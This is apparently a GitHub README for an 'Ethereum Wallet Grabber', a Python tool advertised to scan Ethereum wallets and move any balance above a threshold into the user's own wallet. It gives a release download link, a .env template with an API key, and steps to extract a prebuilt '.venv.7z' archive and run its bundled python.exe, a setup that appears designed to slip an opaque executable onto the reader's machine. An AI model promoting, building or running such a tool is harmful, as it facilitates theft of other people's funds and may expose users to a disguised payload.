# Ethereum Wallet Grabber

[Download full version](https://github.com/stangirlnonstop67/Ethereum-Wallet-Grabber-Balance-Checker/releases)

This Python project scans Ethereum wallets, checks their balances, and transfers funds from wallets that meet a specified balance threshold to another wallet. It uses multithreading to scan and process wallets efficiently and in parallel.

## Features

- **Multithreading Support**: Allows users to run multiple threads to increase scanning speed.
- **Wallet Scanning**: Searches for Ethereum wallets and checks if their balance exceeds a defined threshold.
- **Balance-Based Transfers**: If a wallet’s balance is above the defined minimum, the ETH is transferred to another wallet.
- **Keyboard Shortcuts**: Users can control the program using specific key combinations (e.g., to start, stop, or update the process).

## Requirements

To run this project, make sure you have the following dependencies installed:

- Python 3.11.9  
- `psutil` (to monitor system resources)  
- `keyboard` (to respond to keyboard shortcuts)  
- `colorama` (for colored terminal output)  
- `python-dotenv` (to load environment variables)

Install the dependencies using this command:

```bash
pip install psutil keyboard colorama python-dotenv
```

## Setup

1. Download the project to your computer.
2. Extract the project folder.
3. Create a `.env` file and add the required environment variables. Example:

```env
apiURL=
apiKey=67e5a3903e8b447ab7e34d8a52b38dd1
threadsMulti=6
balance_min=330000000000000
withdraw_wallet=<DESTINATION_WALLET_ADDRESS>
threadsBlock=2
```

- **apiURL**: The API endpoint used for crypto operations.  
- **apiKey**: Your API key to access the service.  
- **balance_min**: Minimum balance (in wei/gwei) to qualify a wallet for transfer.  
- **withdraw_wallet**: The wallet address to which funds will be transferred.  
- **threadsMulti**: Number of threads to run for parallel processing.  
- **threadsBlock**: A parameter for managing thread execution.

## Usage

### Launching the Program

- Install Python 3.11.9. [(Installation Guide)](./INSTALL_Python_3.11.9.md)
- Extract the `.venv.7z` file to the project root folder.
- Open `.\.venv\pyvenv.cfg` and replace `YOUR_USERNAME` with your actual username.
- Start the program using this command:

```
".\.venv\Scripts\python.exe" main.py
```

> Note: The better your computer’s performance, the faster the scan.

### Keyboard Shortcuts

You can control the application with the following key combinations:

- **Alt + K**: Stops the current threads.
- **Alt + R**: Restarts the stopped threads.
- **Alt + Q**: Exits the application.
- **Alt + U**: Clears and refreshes the console display.

### Output

The program displays status messages about scanning and transactions in the console. Sample output:

```
-- -- -- --  Worker Count: 8 ||  5  ||  -- -- -- --  Wallets Scanned: 150  -- -- -- --  Wallets Hits: 30 -- -- -- --  UpTime: 00:12:34 -- -- -- --  W/S: 25  -- -- -- --  W/M: 15
```

- **Worker Count**: Number of active threads.
- **Wallets Scanned**: Total number of wallets scanned.
- **Wallets Hits**: Number of wallets with a qualifying balance.
- **UpTime**: Total runtime of the program.
- **W/S**: Time taken per wallet (in seconds).
- **W/M**: Wallets scanned per minute.

## Architecture and Flow

### `ethGrabber` Class

This class handles the core functionality. Main components:

- **`__init__`**: Loads environment variables, sets up threading, and initializes objects.
- **`Grabber`**: The method each thread runs — scans wallets, checks balances, and makes transfers if needed.
- **`update_console`**: Updates the console with runtime and statistics.
- **`run`**: Launches multiple threads and executes the `Grabber` method in each.
